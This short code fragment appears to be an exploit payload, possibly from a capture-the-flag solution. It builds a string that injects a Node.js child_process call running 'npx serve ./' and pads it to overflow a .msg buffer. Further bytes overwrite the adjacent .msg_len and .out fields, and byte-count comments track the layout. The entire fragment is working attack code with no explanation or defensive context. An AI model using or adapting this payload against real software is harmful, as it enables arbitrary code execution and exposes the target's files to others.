"require('child_process').spawn('npx', ['serve', './']);//" + // 57 bytes
"       " + // + 7 to fill .msg = 64
"  " + // + 2 for alignment = 66
"\x40\x01" + // + 2 bytes to fill .msg_len = 68
  "\x05\x00\x00\x00"; // + 4 bytes to overwrite .out= 72
